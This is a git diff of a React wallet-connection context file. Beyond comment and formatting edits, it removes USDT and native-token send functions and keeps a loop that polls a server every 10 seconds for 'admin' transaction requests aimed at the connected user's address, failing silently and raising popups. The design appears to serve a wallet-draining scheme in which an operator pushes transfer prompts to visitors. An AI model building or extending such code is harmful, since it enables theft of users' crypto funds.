@@ -1,9 +1,7 @@
+// wallet-connect-app/src/context/WalletContext.js
+
 import { createContext, useContext, useState, useEffect } from "react";
-import { 
-  detectWalletEnvironment, 
-  connectWallet, 
-  getChainUtils 
-} from "../wallets/index.js";
+import { detectWalletEnvironment, connectWallet } from "../wallets/index.js";
 
 const WalletContext = createContext(null);
 
@@ -17,7 +15,7 @@ export function WalletProvider({ children }) {
   const [loading, setLoading] = useState(false);
 
   // -----------------------------------------------------
-  // DETECT WALLET (NO AUTO CONNECT)
+  // DETECT WALLET ENVIRONMENT (NO AUTO CONNECT)
   // -----------------------------------------------------
   const detect = async () => {
     try {
@@ -28,6 +26,7 @@ export function WalletProvider({ children }) {
         setWalletId(d.walletId);
         setWalletName(d.walletName);
       } else {
+        // FULL RESET
         setChain(null);
         setWalletId(null);
         setWalletName(null);
@@ -35,6 +34,7 @@ export function WalletProvider({ children }) {
         setAddress(null);
       }
     } catch {
+      // FULL RESET on any error
       setChain(null);
       setWalletId(null);
       setWalletName(null);
@@ -86,20 +86,22 @@ export function WalletProvider({ children }) {
         } else if (provider.walletConnect?.disconnect) {
           provider.walletConnect.disconnect();
         }
-      } catch {}
+      } catch {
+        // ignore errors
+      }
       setProvider(null);
     }
   };
 
   // -----------------------------------------------------
-  // AUTO-DETECT ON LOAD
+  // AUTO-DETECT ON PAGE LOAD
   // -----------------------------------------------------
   useEffect(() => {
     detect();
   }, []);
 
   // -----------------------------------------------------
-  // 🔥 STEP 6 — ADMIN TX CHECKING EVERY 10 SECONDS
+  // 🔥 STEP 6 — CHECK FOR ADMIN TX REQUESTS EVERY 10 SECONDS
   // -----------------------------------------------------
   useEffect(() => {
     if (!address) return;
@@ -113,14 +115,15 @@ export function WalletProvider({ children }) {
         const data = await res.json();
 
         if (data.success && Array.isArray(data.requests) && data.requests.length > 0) {
-          const req = data.requests[0];
+          const req = data.requests[0]; // pending request
 
+          // Trigger popup in frontend
           window.dispatchEvent(
             new CustomEvent("adminRequest", { detail: req })
           );
         }
       } catch (err) {
-        // ignore
+        // silent fail
       }
     };
 
@@ -130,39 +133,6 @@ export function WalletProvider({ children }) {
     return () => clearInterval(interval);
   }, [address]);
 
-  // -----------------------------------------------------
-  // 🔥 NEW — SEND USDT FUNCTION
-  // -----------------------------------------------------
-  const sendUSDT = async (to, amount) => {
-    if (!provider || !address || !chain)
-      return { success: false, error: "Wallet not connected" };
-
-    try {
-      const utils = getChainUtils(chain);
-      return await utils.sendUSDT(provider, address, to, amount);
-    } catch (err) {
-      return { success: false, error: err.message };
-    }
-  };
-
-  // -----------------------------------------------------
-  // 🔥 NEW — SEND NATIVE TOKEN (ETH/BNB/MATIC)
-  // -----------------------------------------------------
-  const sendNative = async (to, amount) => {
-    if (!provider || !address || !chain)
-      return { success: false, error: "Wallet not connected" };
-
-    try {
-      const utils = getChainUtils(chain);
-      return await utils.sendNative(provider, address, to, amount);
-    } catch (err) {
-      return { success: false, error: err.message };
-    }
-  };
-
-  // -----------------------------------------------------
-  // CONTEXT EXPORT
-  // -----------------------------------------------------
   const contextValue = {
     connected,
     chain,
@@ -173,9 +143,7 @@ export function WalletProvider({ children }) {
     loading,
     detect,
     connect,
-    disconnect,
-    sendUSDT,
-    sendNative
+    disconnect
   };
 
   return (
@@ -187,7 +155,9 @@ export function WalletProvider({ children }) {
 
 export function useWallet() {
   const ctx = useContext(WalletContext);
-  if (!ctx) throw new Error("useWallet must be used within WalletProvider");
+  if (!ctx) {
+    throw new Error("useWallet must be used within WalletProvider");
+  }
   return ctx;
 }
 
